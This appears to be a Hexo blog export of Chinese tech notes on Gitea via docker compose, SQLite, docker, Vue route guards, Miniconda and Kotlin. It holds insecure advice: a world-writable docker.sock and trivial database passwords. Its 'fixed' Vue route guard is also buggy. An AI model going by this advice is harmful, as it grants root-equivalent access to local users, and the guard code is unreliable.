    <content><![CDATA[<h1 id="部署gitea的原因"><a href="#部署gitea的原因" class="headerlink" title="部署gitea的原因"></a>部署gitea的原因</h1><p>使用gitea的<strong>原因</strong>：本质上是因为在本地硬盘上每次学习一些新知识，于是创建一些demo性质的应用。特别是vue，react之类的前端应用。每个项目都会有<code>node_module</code>这个文件夹，这里面有特别多的4k小文件，这导致我备份硬盘数据时。速率总是被压的很低。所以我在想能不能通过一个本地部署的类似github的服务器，实现我对这些项目的备份，然后通过配置<code>.gitignore</code>忽略掉哪些中间过程文件和复杂的库文件。来实现对磁盘的高效率备份。</p>
<p>部署完gitea后，发现他其实可以很好的替代github，gitee来作为我自己的代码仓库使用。而且他也确实有很多优点，包括如下图片等功能。而且他作为本地化服务，我不需要担心网络故障，权限校验等问题。<br><img src="https://image.zfxt.top/hexo-blog/%E8%87%AA%E9%83%A8%E7%BD%B2gitea-2024-12-24-22-49-16.png" alt="自部署gitea-2024-12-24-22-49-16"></p>
<h1 id="部署过程"><a href="#部署过程" class="headerlink" title="部署过程"></a>部署过程</h1><p>这部分内容主要参考<a href="https://www.cnblogs.com/guangdelw/p/18068815">大佬文章</a>以及<a href="https://docs.gitea.com/zh-cn/">gitea官网</a></p>
<p>我只说明我需要使用的<code>docker compose</code>部署的内容</p>
<p>首先配置一个<code>docker-compose.yml</code>，其内容如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">gitea:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 这个nginx_container是我自己创建的一个nginx的网络，实现https代理的功能，而且只通过nginx实现代理，而不占用外部端口。具体内容我会再另一篇关于nginx的实战中说明</span></span><br><span class="line"><span class="comment"># nginx_container:</span></span><br><span class="line">  <span class="comment">#  external: true</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">server:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">gitea/gitea:1.21.1</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">gitea</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">USER_UID=1000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">USER_GID=1000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__database__DB_TYPE=mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__database__HOST=db:3306</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__database__NAME=gitea</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__database__USER=gitea</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__database__PASSWD=gitea</span></span><br><span class="line">      <span class="comment"># 一定要设置好下面的两个环境变量，如果不设置好，使用的时候可能ssh克隆的时候会有问题</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SSH_PORT=20022</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SSH_LISTEN_PORT=22</span></span><br><span class="line">      <span class="comment"># 设置应用程序名称，在页面标题中使用.</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">APP_NAME=&quot;这里是标题&quot;</span></span><br><span class="line">      <span class="comment"># 日志部分</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__log__MODE=file</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__log__ROOT_PATH=/data/gitea/log</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__log__LEVEL=Debug</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__log__FILE_NAME=gitea.log</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__log__MAX_DAYS=7</span></span><br><span class="line">      <span class="comment"># 左移20表示1M 左移23就是8M</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GITEA__log__MAX_SIZE_SHIFT=23</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">gitea</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">nginx_container</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./gitea:/data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/timezone:/etc/timezone:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;30000:3000&quot;</span> <span class="comment"># 如果你直接使用nginx代理后，这里可以直接注释掉，也就不占用30000这个端口，而直接通过nginx代理出来。</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;20022:22&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8.0</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=gitea</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_USER=gitea</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_PASSWORD=gitea</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=gitea</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">gitea</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">--default-authentication-plugin=mysql_native_password</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">--character-set-server=utf8</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">--collation-server=utf8_bin</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./mysql:/var/lib/mysql</span></span><br></pre></td></tr></table></figure>

<p>以上是一些最基础的配置，而关于具体的环境变量等一些选项，请详看关于<strong>原作者的解释</strong>，那里更加详细。我只谈我使用到的部分：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 允许用户推送时直接创建仓库</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">GITEA__repository__ENABLE_PUSH_CREATE_USER=TRUE</span></span><br><span class="line"><span class="comment"># 禁止注册</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">GITEA__service__DISABLE_REGISTRATION=TRUE</span></span><br><span class="line"><span class="comment"># ROOTURL</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">ROOT_URL=&quot;https://gitea.zfxt.top/&quot;</span></span><br></pre></td></tr></table></figure>

<p>这个内容直接在上面<code>docker-compose.yml</code>中配置在enviroment中即可。这些操作，确保了这个git服务只为我自己服务，不允许注册给其他人，我也可以直接推送来完成仓库的创建，做到全命令行操作。</p>
<p>然后运行<code>docker compose up -d</code>即可运行。然后访问对应的网站，完成初始化配置。不知道的话，一路默认下去就好。然后你就可以享受gitea了。</p>
<h1 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a>日常使用</h1><p>当我创建了一个项目，并且使用<code>git init</code>完成本地仓库初始化后，我们就可以把这个仓库推送到我们的gitea中。</p>
<ol>
<li><p>添加远程仓库</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add gitea https://gitea.zfxt.top/&#123;用户名&#125;/&#123;自定义仓库名&#125;.git # gitea是自己任意起的名字，一般默认设置为origin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用git remote -v 查看是否添加成功</span></span><br></pre></td></tr></table></figure>

<p> 类似这样子的样式<br> <img src="https://image.zfxt.top/hexo-blog/%E8%87%AA%E9%83%A8%E7%BD%B2gitea-2024-12-24-23-40-53.png" alt="自部署gitea-2024-12-24-23-40-53"></p>
</li>
<li><p>推送并自动创建仓库<br> 随意编写几个测试文件<br> <img src="https://image.zfxt.top/hexo-blog/%E8%87%AA%E9%83%A8%E7%BD%B2gitea-2024-12-24-23-36-05.png" alt="自部署gitea-2024-12-24-23-36-05"></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;test&quot;</span><br><span class="line">git push -u gitea main # 注意，这里的远程分支要与本地分支同名：可能是master或者是main</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">他推送上去后，会自动创建该仓库，我们就不需要图形化界面点击了</span></span><br></pre></td></tr></table></figure>

<p> <img src="https://image.zfxt.top/hexo-blog/%E8%87%AA%E9%83%A8%E7%BD%B2gitea-2024-12-24-23-47-35.png" alt="自部署gitea-2024-12-24-23-47-35"><br> 使用ai的解释如下<br> <img src="https://image.zfxt.top/hexo-blog/%E8%87%AA%E9%83%A8%E7%BD%B2gitea-2024-12-24-23-38-32.png" alt="自部署gitea-2024-12-24-23-38-32"><br> 之后你默认的<code>git push pull</code>命令都会默认从gitea这个远程分支拉去。同样的，如果你有多个远程仓库分别在github，gitee上，你可以分别使用类似于<code>git push github</code>,<code>git push gitee</code>等方式完成推送</p>
</li>
</ol>
<p>以上</p>
]]></content>
      <categories>
        <category>本地化服务</category>
      </categories>
      <tags>
        <tag>gitea</tag>
      </tags>
  </entry>
  <entry>
    <title>获取 Kotlin 项目的实际目录</title>
    <url>/posts/e2f3584e/</url>
    <content><![CDATA[<p>如何再kotlin中获取当前项目的实际目录。</p>
<ol>
<li>调用基于java实现的方法。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Paths</span><br><span class="line"></span><br><span class="line"><span class="type">val</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;&quot;</span>).toAbsolutePath().toString()       </span><br></pre></td></tr></table></figure></li>
<li>通过系统获取当前目录<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> path = System.getProperty(<span class="string">&quot;user.dir&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>自给自足的 SQLite 轻量级数据库</title>
    <url>/posts/11e2cf34/</url>
    <content><![CDATA[<p>SQLite是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。<br>SQLite 是非常小的，是轻量级的，完全配置时小于 400KiB，省略可选功能配置时小于250KiB。<br>SQLite 是自给自足的，这意味着不需要任何外部的依赖。</p>
<h2 id="sqlite的使用"><a href="#sqlite的使用" class="headerlink" title="sqlite的使用"></a>sqlite的使用</h2><p>第一步，你需要安装sqlite，他与mysql的安装并不一样，他只有sqlite3.def、sqlite3.dll 和 sqlite3.exe 文件三个文件，所以他是极为轻量级的。(windows中)<br>linux中的话，直接apt或者yum安装会更快一些<br>他的下载地址为(下载)[<a href="http://www.sqlite.org/download.html]">http://www.sqlite.org/download.html]</a><br>安装后，添加到PATH路径，他便可以基本使用了，在本笔记里，不细讲他的各种细节，只为快速使用而写。<br>然后了解一些基本命令</p>
<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">C:\&gt;sqlite3</span><br><span class="line">SQLite version 3.7.15.2 2013-01-09 11:53:05</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> instructions</span><br><span class="line">Enter SQL statements terminated with a <span class="string">&quot;;&quot;</span></span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure>
<p>输入<code>sqlite3</code>后进入sqlite的内部<br><code>.quit</code>退出sqlite3提示符<br><code>.open</code>如果存在文件则直接打开文件，如果不存在则创建</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlite&gt;.open test.db</span><br></pre></td></tr></table></figure>
<blockquote>
<p>tip:在sqlite中一个db就是一个数据库。</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlite3 testDB.db .dump &gt; testDB.sql</span><br></pre></td></tr></table></figure>
<p>以上命令可以将数据库的内容备份到testDB.sql中</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlite3 testDB.db &lt; testDB.sql</span><br></pre></td></tr></table></figure>
<p>这个命令可以将数据库的内容重新导入会db文件内。</p>
<h3 id="以上就是一些简单的介绍"><a href="#以上就是一些简单的介绍" class="headerlink" title="以上就是一些简单的介绍"></a>以上就是一些简单的介绍</h3>]]></content>
      <tags>
        <tag>Sqlite</tag>
      </tags>
  </entry>
  <entry>
    <title>获取docker run命令</title>
    <url>/posts/7717c1b7/</url>
    <content><![CDATA[<blockquote>
<p>有时候我们需要获取docker run命令，比如我们在docker中运行了一个容器或者别人帮我们启动了一个docker但是未告知我们应该如何再启动一个。这时候我们可以通过docker inspect命令来获取。</p>
</blockquote>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install runlike</span><br></pre></td></tr></table></figure>

<h2 id="支持的参数"><a href="#支持的参数" class="headerlink" title="支持的参数"></a>支持的参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">runlike nginx <span class="comment"># 获取nginx容器的run命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Usage: runlike [OPTIONS] [CONTAINER]</span><br><span class="line"></span><br><span class="line">  Shows <span class="built_in">command</span> line necessary to run copy of existing Docker container.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --no-name     Do not include container name <span class="keyword">in</span> output</span><br><span class="line">  -p, --pretty</span><br><span class="line">  -s, --stdin</span><br><span class="line">  --<span class="built_in">help</span>        Show this message and <span class="built_in">exit</span>.</span><br></pre></td></tr></table></figure>

<h2 id="已启动容器通过-docker-update-对设置-restart-选项"><a href="#已启动容器通过-docker-update-对设置-restart-选项" class="headerlink" title="已启动容器通过 docker update 对设置 restart 选项"></a>已启动容器通过 docker update 对设置 restart 选项</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker update --restart=always docker_id</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>让pdf阅读变成深色模式</title>
    <url>/posts/568dc21b/</url>
    <content><![CDATA[<p><img src="https://image.zfxt.top/hexo-blog/%E8%AE%A9pdf%E9%98%85%E8%AF%BB%E5%8F%98%E6%88%90%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F-2024-11-08-18-34-59.gif" alt="让pdf阅读变成深色模式-2024-11-08-18-34-59"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">void</span>(<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">style</span>.<span class="property">filter</span>=<span class="string">&#x27;invert(89%)&#x27;</span>)</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">style</span>.<span class="property">filter</span>=<span class="string">&#x27;invert(89%)&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>设置非root账号不用sudo直接执行docker命令</title>
    <url>/posts/d40ca6b1/</url>
    <content><![CDATA[<blockquote>
<p>起因是经常使用docker，但使用的是自己的账户，这样就每次都需要使用sudo来创建容器和相关的目录。而这样带来的后果就是，我后续的每一个操作都需要加上sudo命令。否则连修改文件都做不到。因此写下这篇文章</p>
</blockquote>
<p>设置</p>
<ul>
<li>创建名为docker的组，如果之前已经有该组就会报错，可以忽略这个错误：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> groupadd docker</span><br></pre></td></tr></table></figure>

<ul>
<li>将当前用户加入组docker：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span><br></pre></td></tr></table></figure>

<ul>
<li>重启docker服务(生产环境请慎用)：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>

<ul>
<li>添加访问和执行权限：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> a+rw /var/run/docker.sock</span><br></pre></td></tr></table></figure>

<p>然后就可以了，不用再使用sudo命令了。</p>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>路由守卫栈内存溢出处理</title>
    <url>/posts/791f7a0e/</url>
    <content><![CDATA[<h1 id="路由补充"><a href="#路由补充" class="headerlink" title="路由补充"></a>路由补充</h1><h2 id="RangeError-Maximum-call-stack-size"><a href="#RangeError-Maximum-call-stack-size" class="headerlink" title="RangeError: Maximum call stack size"></a>RangeError: Maximum call stack size</h2><p>报以上错误。其大意是说栈内存溢出。<br>以下是我写的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.beforeEach((to,from,next)=&gt;&#123;</span><br><span class="line">    if(!localStorage.getItem(&quot;token&quot;))&#123;</span><br><span class="line">        next(&quot;/login&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>现在分析一下。假设他跳转到login页面，然后他会判断是否有token，判断完成，他将眺望login页面。跳转之后他又会进行判断是否又token</p>
<blockquote>
<p>因为他不是next()，按照他的流程接着跳转。而是采用了next(“&#x2F;login”)，表示他会重新发起一次跳转，也就是会再过一遍路由守卫。因此他会堆栈溢出而报错。<br>修改后的代码可以改为</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.beforeEach((to,from,next)=&gt;&#123;</span><br><span class="line">    </span><br><span class="line">    if(to.path===&quot;/login&quot;)&#123;</span><br><span class="line">        next()</span><br><span class="line">    &#125;</span><br><span class="line">    if(!localStorage.getItem(&quot;token&quot;))&#123;</span><br><span class="line">        next(&quot;/login&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>路由守卫：全局、独享、组件内</title>
    <url>/posts/87e09fe4/</url>
    <content><![CDATA[<h1 id="路由守卫"><a href="#路由守卫" class="headerlink" title="路由守卫"></a>路由守卫</h1><p>需要在路由中进行配置</p>
<h2 id="全局路由前置"><a href="#全局路由前置" class="headerlink" title="全局路由前置"></a>全局路由前置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全局前置路由守卫</span><br><span class="line">//切换路由或者初始化的时候都会调用一次</span><br><span class="line">//to:前往的地址。from：过来的地址。next：是否允许前往，调用后即放行</span><br><span class="line">route.beforeEach((to,from,next)=&gt;</span><br><span class="line">&#123;</span><br><span class="line">  next()//允许放行</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>可以在路由中的meta属性中添加属性。来选择那些路由需要鉴权。哪些不需要鉴权。</p>
<h2 id="后置"><a href="#后置" class="headerlink" title="后置"></a>后置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全局前置路由守卫</span><br><span class="line">//切换路由或者初始化的时候都会调用一次</span><br><span class="line">//to:前往的地址。from：过来的地址。next：是否允许前往，调用后即放行</span><br><span class="line">route.afterEach((to,from)=&gt;</span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="独享路由守卫"><a href="#独享路由守卫" class="headerlink" title="独享路由守卫"></a>独享路由守卫</h2><p>在每个子路由内使用<br>beforeEnter:  (to,from,next)&#x3D;&gt;{}<br>他的逻辑和全局路由守卫一样，但是他只写在单个子路由内。<br>而且独享路由守卫只有前置路由守卫。</p>
<h2 id="组件内路由守卫"><a href="#组件内路由守卫" class="headerlink" title="组件内路由守卫"></a>组件内路由守卫</h2><p><img src="https://memos.zfxt.top/o/r/45/3f903875-0cc1-4d53-ab5c-94176485272f/1682568834_image.png" alt="image"></p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>轻量级Python环境管理：Miniconda</title>
    <url>/posts/61ac6d7/</url>
    <content><![CDATA[<h2 id="anaconda作为python的版本管理神器，但由于他的体积太大，安装后大概占约2G左右的空间，因此这里推荐使用miniconda。"><a href="#anaconda作为python的版本管理神器，但由于他的体积太大，安装后大概占约2G左右的空间，因此这里推荐使用miniconda。" class="headerlink" title="anaconda作为python的版本管理神器，但由于他的体积太大，安装后大概占约2G左右的空间，因此这里推荐使用miniconda。"></a>anaconda作为python的版本管理神器，但由于他的体积太大，安装后大概占约2G左右的空间，因此这里推荐使用miniconda。</h2><h2 id="下载安装conda"><a href="#下载安装conda" class="headerlink" title="下载安装conda"></a>下载安装conda</h2><p>由于官网下载太慢，因此推荐去(清华大学开源软件镜像站下载)[<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/?C=M&O=D%5D">https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/?C=M&amp;O=D]</a></p>
<h3 id="修改conda源"><a href="#修改conda源" class="headerlink" title="修改conda源"></a>修改conda源</h3><p>安装后，需要进行换源，不然下载，导包都会异常缓慢。</p>
<ul>
<li>conda配置文件位置：~&#x2F;.condarc (Windows路径为：C:\Users<UserName>.condarc)</li>
<li>清华源配置，通常配置写入标准库的内容即可，若要使用附加库的内容才将其插入“ - defaults”那一行前面：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">channels:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/menpo/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">defaults</span></span><br><span class="line"><span class="attr">show_channel_urls:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="修改pip源"><a href="#修改pip源" class="headerlink" title="修改pip源"></a>修改pip源</h3><ul>
<li>pip配置文件位置：~&#x2F;.pip&#x2F;pip.conf (Windows路径为：C:\Users<UserName>\pip\pip.ini)</li>
<li>阿里源配置：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">global</span>]</span><br><span class="line"><span class="string">index-url</span> <span class="string">=</span> <span class="string">https://mirrors.aliyun.com/pypi/simple/</span></span><br><span class="line"><span class="string">trusted-host=mirrors.aliyun.com</span></span><br><span class="line"><span class="string">timeout</span> <span class="string">=</span> <span class="number">120</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="建议conda只用来更新conda和python、下载和更新python包使用pip，因为清华源和交大源下载速度远远不及阿里源和华为源。"><a href="#建议conda只用来更新conda和python、下载和更新python包使用pip，因为清华源和交大源下载速度远远不及阿里源和华为源。" class="headerlink" title="建议conda只用来更新conda和python、下载和更新python包使用pip，因为清华源和交大源下载速度远远不及阿里源和华为源。"></a>建议conda只用来更新conda和python、下载和更新python包使用pip，因为清华源和交大源下载速度远远不及阿里源和华为源。</h1><p>更新conda</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda update conda</span><br></pre></td></tr></table></figure>
<p>更新python</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda update python</span><br></pre></td></tr></table></figure>
<p>更新所有包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda update --all</span><br></pre></td></tr></table></figure>
<p>清除无用的包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda clean -p        <span class="comment"># 清理无用的包</span></span><br><span class="line">conda clean -t        <span class="comment"># 清理tar包</span></span><br><span class="line">conda clean -y --all  <span class="comment"># 清理所有安装包及cache</span></span><br></pre></td></tr></table></figure>
<h2 id="conda管理虚拟环境，他默认为base环境"><a href="#conda管理虚拟环境，他默认为base环境" class="headerlink" title="conda管理虚拟环境，他默认为base环境"></a>conda管理虚拟环境，他默认为base环境</h2><p>需要打开自动进入base环境，使用下面的命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda config --<span class="built_in">set</span> auto_activate_base <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>创建自定义环境</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda create --name py38 python=3.8</span><br></pre></td></tr></table></figure>
<p>查看所有环境</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda <span class="built_in">env</span> list</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>miniconda</tag>
      </tags>
  </entry>
  <entry>
    <title>通过文件读写实现聊天对话（kotlin）</title>
    <url>/posts/4e2d082b/</url>
    <content><![CDATA[<p>首先声明，这个任务并没有实现，我暂时没找到可以用来解决kotlin中实时监听键盘动作，并且不会阻塞的回调方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> kotlinx.coroutines.*</span><br><span class="line"><span class="keyword">import</span> java.io.File</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader</span><br><span class="line"></span><br><span class="line"> fun <span class="title function_">main</span><span class="params">()</span>= runBlocking&#123;</span><br><span class="line">    <span class="type">val</span> <span class="variable">file</span> <span class="operator">=</span> File(<span class="string">&quot;src/main/resources/a.txt&quot;</span>)</span><br><span class="line">     <span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">        println(<span class="string">&quot;第$&#123;i++&#125;次访问文件&quot;</span>)</span><br><span class="line">        delay(<span class="number">2000</span>)</span><br><span class="line">        println(file.readText())</span><br><span class="line">        println(<span class="string">&quot;读取完成&quot;</span>)</span><br><span class="line"><span class="comment">//        if(readln()==&quot;chat&quot;)&#123;</span></span><br><span class="line"><span class="comment">//            var message = readln()</span></span><br><span class="line"><span class="comment">//            file.writeText(message)</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上代码可以实现每隔两秒钟对文件进行一次读取操作，期间我可以通过文本编辑器对文件进行写操作，然后他能够实时更新到我写的内容，于是，考虑能否通过文件读写进行聊天对话？<br>** 因为，在不同的操作系统中，换行符的表示方式是不一样的。在UNIX系统中，换行符使用”\n” , 在 windows 系统中换行使用 “\r\n”; 在旧版macOS中换行使用回车符”&#x2F;r”,在新版macOS中使用与unix系统相同的换行方式。**<br>然后\r:13;\n:10，这就是为什么会在文件读取中会读取到则会两个ascii码的原因</p>
<h2 id="javaIO读写原理"><a href="#javaIO读写原理" class="headerlink" title="javaIO读写原理"></a>javaIO读写原理</h2><p>接下来这部分内容引用自<a href="https://zhuanlan.zhihu.com/p/442239987">某位知乎大佬</a>,<br>无论是Socket的读写还是文件的读写，在Java层面的应用开发或者是linux系统底层开发，都属于输入input和输出output的处理，简称为IO读写。在原理上和处理流程上，都是一致的。区别在于参数的不同。</p>
<p>先强调一个基础知识：read系统调用，并不是把数据直接从物理设备，读数据到内存。write系统调用，也不是直接把数据，写入到物理设备。</p>
<p>read系统调用，是把数据从内核缓冲区复制到进程缓冲区；而write系统调用，是把数据从进程缓冲区复制到内核缓冲区。这个两个系统调用，都不负责数据在内核缓冲区和磁盘之间的交换。底层的读写交换，是由操作系统kernel内核完成的。</p>
<h3 id="内核缓冲与进程缓冲区"><a href="#内核缓冲与进程缓冲区" class="headerlink" title="内核缓冲与进程缓冲区"></a>内核缓冲与进程缓冲区</h3><p>缓冲区的目的，是为了减少频繁的系统IO调用。大家都知道，系统调用需要保存之前的进程数据和状态等信息，而结束调用之后回来还需要恢复之前的信息，为了减少这种损耗时间、也损耗性能的系统调用，于是出现了缓冲区。</p>
<p>有了缓冲区，操作系统使用read函数把数据从内核缓冲区复制到进程缓冲区，write把数据从进程缓冲区复制到内核缓冲区中。等待缓冲区达到一定数量的时候，再进行IO的调用，提升性能。至于什么时候读取和存储则由内核来决定，用户程序不需要关心。</p>
<p>在linux系统中，系统内核也有个缓冲区叫做内核缓冲区。每个进程有自己独立的缓冲区，叫做进程缓冲区。</p>
<p>所以，用户程序的IO读写程序，大多数情况下，并没有进行实际的IO操作，而是在读写自己的进程缓冲区。</p>
